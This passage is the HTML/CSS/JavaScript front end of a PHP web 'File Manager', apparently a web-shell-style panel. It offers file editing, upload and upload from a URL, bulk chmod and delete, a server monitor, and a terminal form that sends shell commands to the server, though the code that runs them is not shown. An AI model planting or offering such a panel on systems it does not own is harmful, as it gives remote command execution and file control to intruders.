        .mobile-menu {
            display: flex;
        }
        
        .desktop-only {
            display: none;
        }
        
        .bulk-options {
            grid-template-columns: 1fr;
        }
    }
    
    @media (max-width: 480px) {
        .card {
            padding: 12px;
        }
        
        .action-btn {
            padding: 6px 10px;
            font-size: 11px;
        }
        
        .btn-neon {
            padding: 8px 12px;
            font-size: 13px;
        }
        
        th, td {
            padding: 8px 10px;
            font-size: 12px;
        }
        
        .filename {
            max-width: 150px;
        }
    }
    
    /* Loading animation */
    .loader {
        border: 3px solid rgba(255,255,255,0.1);
        border-top: 3px solid var(--neon-cyan);
        border-radius: 50%;
        width: 30px;
        height: 30px;
        animation: spin 1s linear infinite;
        margin: 20px auto;
    }
    
    @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
    }
    </style>
</head>
<body>
    <?php if (isset($_SESSION['msg'])): ?>
        <div class="notification" id="msg"><?=esc($_SESSION['msg'])?></div>
        <?php unset($_SESSION['msg']); ?>
    <?php endif; ?>
    
    <div class="container">
        <div class="header">
            <div class="brand">
                <div class="logo">FM</div>
                <div>
                    <div class="title">File Manager</div>
                    <div class="small"><?=esc($dir)?></div>
                </div>
            </div>
            
            <div class="controls">
                <form method="GET" style="display:flex;gap:8px;flex:1;max-width:400px;">
                    <input type="text" name="dir" placeholder="Path..." class="input" value="<?=esc($dir)?>" style="flex:1">
                    <button class="action-btn" type="submit">📂 Go</button>
                </form>
                
                <div class="btn-group desktop-only">
                    <a href="?dir=<?=urlencode($dir)?>&show_monitor=1"><button class="action-btn">📊 Monitor</button></a>
                    <a href="?dir=<?=urlencode($dir)?>&show_terminal=1"><button class="action-btn">💻 Terminal</button></a>
                    <a href="?dir=<?=urlencode($dir)?>&show_bulk=1"><button class="action-btn">📦 Bulk Ops</button></a>
                    <a href="?dir=<?=urlencode($dir)?>&show_upload=1"><button class="action-btn">📤 Upload</button></a>
                    <a href="?logout=1"><button class="action-btn btn-danger">🚪 Logout</button></a>
                </div>
            </div>
        </div>
        
        <div class="top-row">
            <div class="card">
                <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;flex-wrap:wrap;">
                    <h3>📁 <?=esc(basename($dir) ?: $dir)?></h3>
                    <div class="small">Items: <?php $files = @scandir($dir); echo $files ? count($files)-2 : 0; ?></div>
                </div>
                
                <div id="bulkActionsBar" class="bulk-actions-bar" style="display:none">
                    <strong style="color:var(--neon-mag)">📦 Bulk Actions:</strong>
                    <button type="button" class="action-btn btn-danger" onclick="doBulk('delete')">🗑 Delete</button>
                    <button type="button" class="action-btn btn-success" onclick="showSection('zip')">📦 Zip</button>
                    <button type="button" class="action-btn btn-warning" onclick="showSection('unzip')">📁 Unzip</button>
                    <button type="button" class="action-btn" onclick="showSection('copy')">📋 Copy</button>
                    <button type="button" class="action-btn" onclick="showSection('move')">🚚 Move</button>
                    <button type="button" class="action-btn" onclick="showSection('chmod')">🔐 Chmod</button>
                    <button type="button" class="action-btn" onclick="showSection('rename')">📝 Rename</button>
                    <button type="button" class="action-btn" onclick="showSection('export')">📊 Export</button>
                    <button type="button" class="action-btn" onclick="clearSel()" style="background:linear-gradient(90deg,#666,#999)">❌ Clear</button>
                    <span id="selectedCount" class="selected-count">0 selected</span>
                </div>
                
                <div class="form-grid">
                    <form method="POST" style="display:flex;gap:8px">
                        <input class="input" name="new_folder" placeholder="New folder" required>
                        <button class="btn-neon" type="submit">📁</button>
                    </form>
                    <form method="POST" style="display:flex;gap:8px">
                        <input class="input" name="new_file" placeholder="New file" required>
                        <button class="btn-neon" type="submit">📄</button>
                    </form>
                </div>
                
                <div class="table-wrap" style="margin-top:15px">
                    <form id="bulkForm" method="POST">
                        <table>
                            <thead>
                                <tr>
                                    <th style="width:30px"><input type="checkbox" class="bulk-checkbox" id="selectAll" onclick="toggleAll()"></th>
                                    <th>Name</th>
                                    <th>Type</th>
                                    <th>Size</th>
                                    <th>Actions</th>
                                </tr>
                            </thead>
                            <tbody>
                                <?php 
                                $files = @scandir($dir);
                                if ($files === false) $files = [];
                                $parent = dirname($dir);
                                ?>
                                
                                <?php if ($dir != '/' && $dir != '' && $parent != $dir): ?>
                                <tr>
                                    <td></td>
                                    <td class="filename">..</td>
                                    <td class="filetype">📁 Parent</td>
                                    <td class="kv">-</td>
                                    <td style="white-space:nowrap">
                                        <a href="?dir=<?=urlencode($parent)?>">
                                            <button class="action-btn" type="button">📂 Open</button>
                                        </a>
                                    </td>
                                </tr>
                                <?php endif; ?>
                                
                                <?php foreach ($files as $f): ?>
                                    <?php if ($f == '.' || $f == '..') continue; ?>
                                    <?php
                                    $p = $dir.'/'.$f;
                                    $is_dir = is_dir($p);
                                    $size = !$is_dir ? @filesize($p) : 0;
                                    ?>
                                    <tr>
                                        <td><input type="checkbox" class="bulk-checkbox" name="bulk_selected[]" value="<?=esc($f)?>" onchange="updateSel()"></td>
                                        <td class="filename"><?=esc($f)?></td>
                                        <td class="filetype"><?=$is_dir?'📁 Folder':'📄 File'?></td>
                                        <td class="kv"><?=!$is_dir?hfs($size):'-'?></td>
                                        <td style="white-space:nowrap">
                                            <?php if ($is_dir): ?>
                                                <a href="?dir=<?=urlencode($p)?>"><button class="action-btn" type="button">📂 Open</button></a>
                                                <form method="POST" style="display:inline">
                                                    <input type="hidden" name="del_file" value="<?=esc($p)?>">
                                                    <button class="action-btn btn-danger" onclick="return confirm('Delete folder <?=esc($f)?>?')">🗑</button>
                                                </form>
                                            <?php else: ?>
                                                <a href="<?=esc($p)?>" download><button class="action-btn" type="button">⬇️ DL</button></a>
                                                <form method="POST" style="display:inline">
                                                    <input type="hidden" name="edit_file" value="<?=esc($p)?>">
                                                    <button class="action-btn">✏️ Edit</button>
                                                </form>
                                                <form method="POST" style="display:inline">
                                                    <input type="hidden" name="del_file" value="<?=esc($p)?>">
                                                    <button class="action-btn btn-danger" onclick="return confirm('Delete file <?=esc($f)?>?')">🗑</button>
                                                </form>
                                            <?php endif; ?>
                                        </td>
                                    </tr>
                                <?php endforeach; ?>
                                
                                <?php if (count($files) <= 2): ?>
                                    <tr><td colspan="5" style="text-align:center;padding:30px;color:var(--muted)">📭 Folder is empty</td></tr>
                                <?php endif; ?>
                            </tbody>
                        </table>
                        <input type="hidden" id="bulkAction" name="bulk_action" value="">
                        <input type="hidden" id="zipName" name="zip_name" value="">
                        <input type="hidden" id="bulkTarget" name="bulk_target" value="">
                        <input type="hidden" id="chmodMode" name="chmod_mode" value="">
                        <input type="hidden" id="chmodRecursive" name="chmod_recursive" value="">
                        <input type="hidden" id="renamePattern" name="rename_pattern" value="">
                        <input type="hidden" id="renameType" name="rename_type" value="">
                        <input type="hidden" id="renameSearch" name="rename_search" value="">
                        <input type="hidden" id="renameReplace" name="rename_replace" value="">
                    </form>
                </div>
            </div>
        </div>
    </div>
    
    <!-- Mobile Menu -->
    <div class="mobile-menu">
        <a href="?dir=<?=urlencode($dir)?>&show_monitor=1"><button class="mobile-menu-btn">📊</button></a>
        <a href="?dir=<?=urlencode($dir)?>&show_terminal=1"><button class="mobile-menu-btn">💻</button></a>
        <a href="?dir=<?=urlencode($dir)?>&show_bulk=1"><button class="mobile-menu-btn">📦</button></a>
        <a href="?dir=<?=urlencode($dir)?>&show_upload=1"><button class="mobile-menu-btn">📤</button></a>
        <a href="?logout=1"><button class="mobile-menu-btn" style="background:var(--danger)">🚪</button></a>
    </div>
    
    <!-- BULK OPERATIONS POPUP - DIPERBAIKI -->
    <?php if ($show_bulk): ?>
    <div class="popup-overlay">
        <div class="popup-content" style="width:700px;max-width:95vw;">
            <div class="popup-header">
                <h4>📦 Bulk Operations</h4>
                <a href="?dir=<?=urlencode($dir)?>"><button class="popup-close">×</button></a>
            </div>
            <div class="popup-body">
                <div style="margin-bottom:15px;padding:10px;background:rgba(109,240,255,0.05);border-radius:8px;">
                    <strong style="color:var(--neon-cyan)">Selected: <span id="popupSelectedCount">0</span> items</strong>
                    <div style="font-size:12px;color:var(--muted);margin-top:5px;">Select files from the main table first</div>
                </div>
                
                <!-- Zip Section -->
                <div id="zipSection" class="bulk-section">
                    <h5>📦 Create ZIP Archive</h5>
                    <div class="option-group">
                        <label class="option-label">ZIP Filename (optional)</label>
                        <input type="text" id="zipFilename" class="input" placeholder="archive.zip">
                        <div style="font-size:11px;color:var(--muted);margin-top:5px;">Leave empty for: archive_<?=date('Ymd_His')?>.zip</div>
                    </div>
                    <button type="button" class="btn-neon" onclick="executeBulk('zip')" style="width:100%;margin-top:10px;">Create ZIP</button>
                </div>
                
                <!-- Unzip Section -->
                <div id="unzipSection" class="bulk-section" style="display:none;">
                    <h5>📁 Extract ZIP Files</h5>
                    <div style="color:var(--muted);font-size:12px;margin-bottom:10px;">
                        Extracts all selected ZIP files to current directory
                    </div>
                    <button type="button" class="btn-warning" onclick="executeBulk('unzip')" style="width:100%;">Extract ZIPs</button>
                </div>
                
                <!-- Copy Section -->
                <div id="copySection" class="bulk-section" style="display:none;">
                    <h5>📋 Copy Files/Folders</h5>
                    <div class="option-group">
                        <label class="option-label">Target Directory</label>
                        <input type="text" id="copyTarget" class="input" placeholder="/path/to/target" value="<?=esc($dir)?>">
                        <div style="font-size:11px;color:var(--muted);margin-top:5px;">Where to copy the selected items</div>
                    </div>
                    <button type="button" class="btn-neon" onclick="executeBulk('copy')" style="width:100%;margin-top:10px;">Copy Items</button>
                </div>
                
                <!-- Move Section -->
                <div id="moveSection" class="bulk-section" style="display:none;">
                    <h5>🚚 Move Files/Folders</h5>
                    <div class="option-group">
                        <label class="option-label">Target Directory</label>
                        <input type="text" id="moveTarget" class="input" placeholder="/path/to/target" value="<?=esc($dir)?>">
                        <div style="font-size:11px;color:var(--muted);margin-top:5px;">Where to move the selected items</div>
                    </div>
                    <button type="button" class="btn-neon" onclick="executeBulk('move')" style="width:100%;margin-top:10px;">Move Items</button>
                </div>
                
                <!-- Chmod Section -->
                <div id="chmodSection" class="bulk-section" style="display:none;">
                    <h5>🔐 Change Permissions</h5>
                    <div class="option-group">
                        <label class="option-label">Permissions (octal)</label>
                        <select id="chmodSelect" class="input">
                            <option value="0644">0644 - Files (rw-r--r--)</option>
                            <option value="0755">0755 - Folders/Scripts (rwxr-xr-x)</option>
                            <option value="0777">0777 - Full Access (rwxrwxrwx)</option>
                            <option value="0600">0600 - Owner only (rw-------)</option>
                            <option value="0744">0744 - Owner full, others read (rwxr--r--)</option>
                        </select>
                    </div>
                    <div class="option-group">
                        <label class="checkbox-label">
                            <input type="checkbox" id="chmodRecursiveCheck"> Apply recursively to folders
                        </label>
                    </div>
                    <button type="button" class="btn-neon" onclick="executeBulk('chmod')" style="width:100%;margin-top:10px;">Change Permissions</button>
                </div>
                
                <!-- Rename Section -->
                <div id="renameSection" class="bulk-section" style="display:none;">
                    <h5>📝 Batch Rename</h5>
                    <div class="option-group">
                        <label class="option-label">Rename Type</label>
                        <select id="renameTypeSelect" class="input" onchange="showRenameOptions()">
                            <option value="prefix">Add Prefix</option>
                            <option value="suffix">Add Suffix</option>
                            <option value="replace">Replace Text</option>
                            <option value="number">Add Numbering</option>
                            <option value="lowercase">Convert to Lowercase</option>
                            <option value="uppercase">Convert to Uppercase</option>
                        </select>
                    </div>
                    
                    <div id="prefixOption" class="option-group">
                        <label class="option-label">Prefix Text</label>
                        <input type="text" id="prefixText" class="input" placeholder="prefix_">
                    </div>
                    
                    <div id="suffixOption" class="option-group" style="display:none;">
                        <label class="option-label">Suffix Text</label>
                        <input type="text" id="suffixText" class="input" placeholder="_suffix">
                    </div>
                    
                    <div id="replaceOption" class="option-group" style="display:none;">
                        <label class="option-label">Search Text</label>
                        <input type="text" id="searchText" class="input" placeholder="old_text">
                        <label class="option-label" style="margin-top:10px;">Replace With</label>
                        <input type="text" id="replaceText" class="input" placeholder="new_text">
                    </div>
                    
                    <button type="button" class="btn-neon" onclick="executeBulk('rename')" style="width:100%;margin-top:10px;">Rename Items</button>
                </div>
                
                <!-- Export Section -->
                <div id="exportSection" class="bulk-section" style="display:none;">
                    <h5>📊 Export File List</h5>
                    <div style="color:var(--muted);font-size:12px;margin-bottom:10px;">
                        Exports a detailed list of selected files to a text file
                    </div>
                    <button type="button" class="btn-success" onclick="executeBulk('export_list')" style="width:100%;">Export to TXT</button>
                </div>
                
                <!-- Delete Section -->
                <div id="deleteSection" class="bulk-section" style="display:none;">
                    <h5>🗑 Delete Files/Folders</h5>
                    <div style="color:var(--danger);font-size:12px;margin-bottom:15px;padding:10px;background:rgba(255,95,122,0.1);border-radius:6px;">
                        ⚠️ Warning: This action cannot be undone! Files will be permanently deleted.
                    </div>
                    <button type="button" class="btn-danger" onclick="executeBulk('delete')" style="width:100%;">Permanently Delete</button>
                </div>
                
                <!-- Action Buttons -->
                <div class="bulk-options" style="margin-top:20px;">
                    <button type="button" class="action-btn" onclick="showSection('zip')">📦 Zip</button>
                    <button type="button" class="action-btn" onclick="showSection('unzip')">📁 Unzip</button>
                    <button type="button" class="action-btn" onclick="showSection('copy')">📋 Copy</button>
                    <button type="button" class="action-btn" onclick="showSection('move')">🚚 Move</button>
                    <button type="button" class="action-btn" onclick="showSection('chmod')">🔐 Chmod</button>
                    <button type="button" class="action-btn" onclick="showSection('rename')">📝 Rename</button>
                    <button type="button" class="action-btn" onclick="showSection('export')">📊 Export</button>
                    <button type="button" class="action-btn btn-danger" onclick="showSection('delete')">🗑 Delete</button>
                </div>
            </div>
        </div>
    </div>
    <?php endif; ?>
    
    <!-- POPUP LAINNYA (Monitor, Terminal, Upload, dll) -->
    <!-- SERVER MONITOR POPUP -->
    <?php if ($show_monitor): ?>
    <div class="popup-overlay">
        <div class="popup-content">
            <div class="popup-header">
                <h4>📊 Server Monitor</h4>
                <a href="?dir=<?=urlencode($dir)?>"><button class="popup-close">×</button></a>
            </div>
            <div class="popup-body">
                <?php if ($monitor_result): ?>
                    <div style="display:grid;grid-template-columns:repeat(2,1fr);gap:10px;margin-bottom:15px">
                        <div class="stat-box"><div class="stat-label">Hostname</div><div class="stat-value"><?=esc($monitor_result['system']['hostname'])?></div></div>
                        <div class="stat-box"><div class="stat-label">OS</div><div class="stat-value"><?=esc($monitor_result['system']['os'])?></div></div>
                        <div class="stat-box"><div class="stat-label">PHP Version</div><div class="stat-value"><?=esc($monitor_result['system']['php_version'])?></div></div>
                        <div class="stat-box"><div class="stat-label">Uptime</div><div class="stat-value"><?=esc($monitor_result['system']['uptime'])?></div></div>
                    </div>
                    
                    <h5 style="color:var(--neon-cyan);margin:15px 0 10px 0">CPU Usage</h5>
                    <div style="display:grid;grid-template-columns:repeat(2,1fr);gap:8px;margin-bottom:15px">
                        <div class="stat-box"><div class="stat-label">Cores</div><div class="stat-value"><?=$monitor_result['cpu']['cores']?></div></div>
                        <div class="stat-box"><div class="stat-label">1-min Load</div><div class="stat-value"><?=$monitor_result['cpu']['load_1min']?></div></div>
                        <div class="stat-box"><div class="stat-label">5-min Load</div><div class="stat-value"><?=$monitor_result['cpu']['load_5min']?></div></div>
                        <div class="stat-box" style="border-left-color:<?=$monitor_result['cpu']['status']['color']?>">
                            <div class="stat-label">Status</div><div class="stat-value"><?=$monitor_result['cpu']['status']['text']?></div>
                        </div>
                    </div>
                    
                    <h5 style="color:var(--neon-cyan);margin:15px 0 10px 0">Memory Usage</h5>
                    <div style="display:grid;grid-template-columns:repeat(2,1fr);gap:8px;margin-bottom:15px">
                        <div class="stat-box"><div class="stat-label">Total</div><div class="stat-value"><?=$monitor_result['memory']['total']?></div></div>
                        <div class="stat-box"><div class="stat-label">Used</div><div class="stat-value"><?=$monitor_result['memory']['used']?></div></div>
                        <div class="stat-box"><div class="stat-label">Free</div><div class="stat-value"><?=$monitor_result['memory']['free']?></div></div>
                        <div class="stat-box" style="border-left-color:<?=$monitor_result['memory']['status']['color']?>">
                            <div class="stat-label">Status</div><div class="stat-value"><?=$monitor_result['memory']['status']['text']?></div>
                        </div>
                    </div>
                    
                    <h5 style="color:var(--neon-cyan);margin:15px 0 10px 0">Disk Usage</h5>
                    <div style="display:grid;grid-template-columns:repeat(2,1fr);gap:8px;margin-bottom:15px">
                        <div class="stat-box"><div class="stat-label">Total</div><div class="stat-value"><?=$monitor_result['disk']['total']?></div></div>
                        <div class="stat-box"><div class="stat-label">Used</div><div class="stat-value"><?=$monitor_result['disk']['used']?></div></div>
                        <div class="stat-box"><div class="stat-label">Free</div><div class="stat-value"><?=$monitor_result['disk']['free']?></div></div>
                        <div class="stat-box" style="border-left-color:<?=$monitor_result['disk']['status']['color']?>">
                            <div class="stat-label">Status</div><div class="stat-value"><?=$monitor_result['disk']['status']['text']?></div>
                        </div>
                    </div>
                    
                    <?php if (!empty($monitor_result['processes'])): ?>
                    <h5 style="color:var(--neon-cyan);margin:15px 0 10px 0">Top Processes</h5>
                    <div style="max-height:200px;overflow:auto;background:rgba(0,0,0,0.2);border-radius:8px;padding:10px">
                        <?php foreach ($monitor_result['processes'] as $proc): ?>
                            <div style="padding:5px 0;border-bottom:1px solid rgba(255,255,255,0.05);font-size:12px">
                                <div><strong><?=esc($proc['cmd'])?></strong></div>
                                <div style="color:var(--muted);font-size:11px">PID: <?=$proc['pid']?> | CPU: <?=$proc['cpu']?>% | MEM: <?=$proc['mem']?>% | User: <?=$proc['user']?></div>
                            </div>
                        <?php endforeach; ?>
                    </div>
                    <?php endif; ?>
                    
                <?php else: ?>
                    <div style="text-align:center;padding:40px;color:var(--muted)">
                        ⚠️ Monitor data unavailable
                    </div>
                <?php endif; ?>
            </div>
        </div>
    </div>
    <?php endif; ?>
    
    <!-- TERMINAL POPUP -->
    <?php if ($show_terminal): ?>
    <div class="popup-overlay">
        <div class="popup-content">
            <div class="popup-header">
                <h4>💻 Terminal</h4>
                <a href="?dir=<?=urlencode($dir)?>"><button class="popup-close">×</button></a>
            </div>
            <div class="popup-body">
                <form method="POST">
                    <input type="hidden" name="term_path" value="<?=esc($dir)?>">
                    <div style="display:flex;gap:8px;margin-bottom:12px">
                        <input type="text" name="term_cmd" class="input" placeholder="Enter command..." style="flex:1" autofocus>
                        <button class="btn-neon" type="submit">Run</button>
                    </div>
                </form>
                <?php if (!empty($term_result)): ?>
                <div style="margin-top:12px;padding:12px;background:rgba(0,0,0,0.3);border-radius:8px">
                    <strong style="color:var(--neon-cyan)">Output:</strong>
                    <pre style="margin-top:8px;color:#e6eef8;font-family:monospace;font-size:11px;max-height:300px;overflow:auto;word-break:break-all;white-space:pre-wrap"><?=esc($term_result)?></pre>
                </div>
                <?php endif; ?>
            </div>
        </div>
    </div>
    <?php endif; ?>
    
    <!-- EDITOR POPUP -->
    <?php if ($show_editor && isset($_SESSION['edit'])): ?>
    <div class="editor-popup-overlay">
        <div class="editor-popup-content">
            <div class="popup-header">
                <h4>✏️ Editing: <?=esc(basename($_SESSION['edit']['path']))?></h4>
                <a href="?dir=<?=urlencode(dirname($_SESSION['edit']['path']))?>"><button class="popup-close">×</button></a>
            </div>
            <div class="popup-body">
                <form method="POST">
                    <textarea name="edit_content" class="editor-textarea" id="editorTextarea"><?=esc($_SESSION['edit']['data'])?></textarea>
                    <input type="hidden" name="edit_path" value="<?=esc($_SESSION['edit']['path'])?>">
                    <div style="display:flex;gap:8px;justify-content:flex-end">
                        <button class="btn-neon" name="save_edit" type="submit">💾 Save</button>
                        <a href="?dir=<?=urlencode(dirname($_SESSION['edit']['path']))?>">
                            <button type="button" class="action-btn">← Back</button>
                        </a>
                    </div>
                </form>
            </div>
        </div>
    </div>
    <?php unset($_SESSION['edit']); endif; ?>
    
    <!-- UPLOAD POPUP -->
    <?php if ($show_upload): ?>
    <div class="popup-overlay">
        <div class="popup-content">
            <div class="popup-header">
                <h4>📤 Upload Files</h4>
                <a href="?dir=<?=urlencode($dir)?>"><button class="popup-close">×</button></a>
            </div>
            <div class="popup-body">
                <form method="POST" enctype="multipart/form-data">
                    <input type="file" name="upload[]" class="input" multiple required>
                    <button type="submit" class="btn-neon" style="width:100%;margin-top:10px">Upload</button>
                </form>
            </div>
        </div>
    </div>
    <?php endif; ?>
    
    <!-- URL UPLOAD POPUP -->
    <?php if ($show_url): ?>
    <div class="popup-overlay">
        <div class="popup-content">
            <div class="popup-header">
                <h4>🔗 URL Upload</h4>
                <a href="?dir=<?=urlencode($dir)?>"><button class="popup-close">×</button></a>
            </div>
            <div class="popup-body">
                <form method="POST">
                    <input type="text" name="url_up" class="input" placeholder="https://example.com/file.zip" required>
                    <input type="text" name="url_fn" class="input" placeholder="Custom filename (optional)" style="margin-top:8px">
                    <button type="submit" class="btn-neon" style="width:100%;margin-top:10px">Download</button>
                </form>
            </div>
        </div>
    </div>
    <?php endif; ?>
    
    <script>
    let selected = [];
    
    function toggleAll() {
        const cbs = document.querySelectorAll('.bulk-checkbox:not(#selectAll)');
        const allChecked = document.getElementById('selectAll').checked;
        cbs.forEach(cb => {
            cb.checked = allChecked;
        });
        updateSel();
    }
    
    function updateSel() {
        selected = [];
        const cbs = document.querySelectorAll('.bulk-checkbox:not(#selectAll)');
        cbs.forEach(cb => {
            if (cb.checked) selected.push(cb.value);
        });
        
        const bar = document.getElementById('bulkActionsBar');
        const cnt = document.getElementById('selectedCount');
        const popupCnt = document.getElementById('popupSelectedCount');
        const all = document.getElementById('selectAll');
        
        if (popupCnt) popupCnt.textContent = selected.length;
        
        if (selected.length > 0) {
            if (bar) {
                bar.style.display = 'flex';
                cnt.textContent = selected.length + ' selected';
                all.checked = cbs.length === selected.length;
            }
        } else {
            if (bar) {
                bar.style.display = 'none';
                all.checked = false;
            }
        }
    }
    
    function clearSel() {
        document.querySelectorAll('.bulk-checkbox').forEach(cb => cb.checked = false);
        selected = [];
        updateSel();
    }
    
    function showSection(section) {
        // Hide all sections
        document.querySelectorAll('.bulk-section').forEach(el => {
            el.style.display = 'none';
        });
        
        // Show selected section
        const target = document.getElementById(section + 'Section');
        if (target) {
            target.style.display = 'block';
            // Scroll to section
            target.scrollIntoView({ behavior: 'smooth', block: 'start' });
        }
    }
    
    function executeBulk(action) {
        if (selected.length === 0) {
            alert('Please select files first!');
            return;
        }
        
        // Set form values based on action
        document.getElementById('bulkAction').value = action;
        
        switch(action) {
            case 'zip':
                const zipName = document.getElementById('zipFilename').value || '';
                document.getElementById('zipName').value = zipName;
                if (!confirm(`Create ZIP archive with ${selected.length} items?`)) return;
                break;
                
            case 'unzip':
                if (!confirm(`Extract ${selected.length} ZIP files?`)) return;
                break;
                
            case 'copy':
                const copyTarget = document.getElementById('copyTarget').value.trim();
                if (!copyTarget) {
                    alert('Please enter target directory');
                    return;
                }
                document.getElementById('bulkTarget').value = copyTarget;
                if (!confirm(`Copy ${selected.length} items to "${copyTarget}"?`)) return;
                break;
                
            case 'move':
                const moveTarget = document.getElementById('moveTarget').value.trim();
                if (!moveTarget) {
                    alert('Please enter target directory');
                    return;
                }
                document.getElementById('bulkTarget').value = moveTarget;
                if (!confirm(`Move ${selected.length} items to "${moveTarget}"?`)) return;
                break;
                
            case 'chmod':
                const chmodMode = document.getElementById('chmodSelect').value;
                const chmodRecursive = document.getElementById('chmodRecursiveCheck').checked;
                document.getElementById('chmodMode').value = chmodMode;
                document.getElementById('chmodRecursive').value = chmodRecursive ? '1' : '0';
                if (!confirm(`Change permissions to ${chmodMode} for ${selected.length} items?`)) return;
                break;
                
            case 'rename':
                const renameType = document.getElementById('renameTypeSelect').value;
                document.getElementById('renameType').value = renameType;
                
                switch(renameType) {
                    case 'prefix':
                        const prefix = document.getElementById('prefixText').value;
                        document.getElementById('renamePattern').value = prefix;
                        if (!prefix) {
                            alert('Please enter prefix text');
                            return;
                        }
                        break;
                    case 'suffix':
                        const suffix = document.getElementById('suffixText').value;
                        document.getElementById('renamePattern').value = suffix;
                        if (!suffix) {
                            alert('Please enter suffix text');
                            return;
                        }
                        break;
                    case 'replace':
                        const search = document.getElementById('searchText').value;
                        const replace = document.getElementById('replaceText').value;
                        document.getElementById('renameSearch').value = search;
                        document.getElementById('renameReplace').value = replace;
                        if (!search) {
                            alert('Please enter search text');
                            return;
                        }
                        break;
                }
                
                if (!confirm(`Rename ${selected.length} items?`)) return;
                break;
                
            case 'export_list':
                if (!confirm(`Export list of ${selected.length} items to TXT file?`)) return;
                break;
                
            case 'delete':
                if (!confirm(`Permanently delete ${selected.length} items? This action cannot be undone!`)) return;
                break;
        }
        
        // Submit form
        document.getElementById('bulkForm').submit();
    }
    
    function showRenameOptions() {
        const type = document.getElementById('renameTypeSelect').value;
        
        // Hide all options
        document.getElementById('prefixOption').style.display = 'none';
        document.getElementById('suffixOption').style.display = 'none';
        document.getElementById('replaceOption').style.display = 'none';
        
        // Show selected option
        switch(type) {
            case 'prefix':
                document.getElementById('prefixOption').style.display = 'block';
                break;
            case 'suffix':
                document.getElementById('suffixOption').style.display = 'block';
                break;
            case 'replace':
                document.getElementById('replaceOption').style.display = 'block';
                break;
        }
    }
    
    // Initialize
    document.addEventListener('DOMContentLoaded', function() {
        updateSel();
        
        // Show notification if exists
        const msg = document.getElementById('msg');
        if (msg) {
            msg.style.display = 'block';
            setTimeout(() => {
                msg.style.display = 'none';
            }, 4000);
        }
        
        // Auto-focus editor textarea
        const editorTextarea = document.getElementById('editorTextarea');
        if (editorTextarea) {
            editorTextarea.focus();
            editorTextarea.selectionStart = editorTextarea.selectionEnd = editorTextarea.value.length;
        }
        
        // Handle logout
        const logoutLinks = document.querySelectorAll('a[href*="logout=1"]');
        logoutLinks.forEach(link => {
            link.addEventListener('click', function(e) {
                if (!confirm('Are you sure you want to logout?')) {
                    e.preventDefault();
                }
            });
        });
        
        // Mobile menu toggle
        const mobileMenuBtn = document.querySelector('.mobile-menu-btn');
        if (mobileMenuBtn) {
            mobileMenuBtn.addEventListener('click', function() {
                const menu = document.querySelector('.mobile-menu');
                menu.style.display = menu.style.display === 'flex' ? 'none' : 'flex';
            });
        }
        
        // Initialize rename options
        showRenameOptions();
        
        // Update selected count in popup
        const popupSelected = document.getElementById('popupSelectedCount');
        if (popupSelected) {
            popupSelected.textContent = selected.length;
        }
    });
    
    // Close popup when clicking outside
    document.addEventListener('click', function(e) {
        if (e.target.classList.contains('popup-overlay')) {
            window.location.href = '?dir=<?=urlencode($dir)?>';
        }
    });
    
    // Handle escape key
    document.addEventListener('keydown', function(e) {
        if (e.key === 'Escape') {
            if (document.querySelector('.popup-overlay')) {
                window.location.href = '?dir=<?=urlencode($dir)?>';
            }
        }
    });
    
    // Update popup selected count when selection changes
    document.addEventListener('change', function() {
        const popupSelected = document.getElementById('popupSelectedCount');
        if (popupSelected) {
            popupSelected.textContent = selected.length;
        }
    });
    </script>
</body>
</html>